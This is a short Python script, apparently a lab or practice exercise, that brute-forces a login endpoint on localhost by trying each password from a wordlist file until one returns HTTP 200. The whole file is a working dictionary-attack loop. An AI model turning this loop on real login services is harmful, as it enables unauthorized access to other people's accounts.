import requests
with open("passwords.txt") as f:
    guesses = f.readlines()


for password in guesses:
    password = password.rstrip()
    response = requests.get(f"http://localhost:8000/login/{password}")
    if response.status_code == 200:
        print(f"Login successful! {password}")
        break
    else:
        print(f"Login unsuccessful for {password}")

# print(response.text)

